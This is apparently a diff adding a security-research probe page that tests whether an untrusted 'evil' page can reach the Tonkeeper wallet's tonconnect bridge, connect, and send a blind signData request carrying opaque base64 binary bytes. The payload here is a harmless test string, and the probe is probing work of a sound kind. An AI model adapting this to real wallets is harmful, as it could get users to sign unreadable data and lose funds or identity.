@@ -1,0 +1,21 @@
+<!doctype html><html><body style="font:14px monospace;padding:10px;background:#fff">
+<div id="s">SIGN-PROBE-BOOT</div><div id="t"></div>
+<script>
+var s=document.getElementById('s'),t=document.getElementById('t');
+function L(x){t.innerHTML+='<div>'+String(x).slice(0,200)+'</div>';}
+L('BOOT origin='+location.origin);
+if(!(window.tonkeeper&&window.tonkeeper.tonconnect)){L('NO_BRIDGE');}
+else{
+L('HAS_BRIDGE');
+var b=window.tonkeeper.tonconnect;
+b.listen(function(ev){L('EVT '+(ev&&ev.event)+' '+(ev&&ev.payload&&JSON.stringify(ev.payload).slice(0,120)))});
+b.connect(2,{manifestUrl:'https://goodman387.github.io/evil/manifest.json',items:[{name:'ton_addr'}]}).then(function(r){
+  L('CONNECT_RESOLVED');
+  s.textContent='PROBE:CONNECTED';
+  var btn=document.createElement('button');btn.textContent='START SIGN-DATA binary';btn.style.cssText='font:20px monospace;padding:18px;width:100%;background:#fd0';
+  btn.onclick=function(){ s.textContent='PROBE:SIGN_SENT_WAIT_SHEET'; b.send({method:'signData',params:{type:'binary',bytes:'SGVsbG8gZnJvbSBldmlsIGZyYW1lIC0gcGxhaW50ZXh0IGluIGJpbmFyeSBibHVyLWJsdXJ5IHNpZ25pbmcgcHJvb2IgMjAyNi0wOS0wMw=='}}).then(function(res){s.textContent='PROBE:SIGNED_OK';L('SIGN RESULT '+JSON.stringify(res).slice(0,300));},function(e){s.textContent='PROBE:SIGN_ERR';L('SIGN ERR '+e);});
+  };
+  document.body.appendChild(btn);
+},function(e){L('CONNECT_REJ '+e);s.textContent='PROBE:CONNECT_REJECTED';});
+}
+</script></body></html>
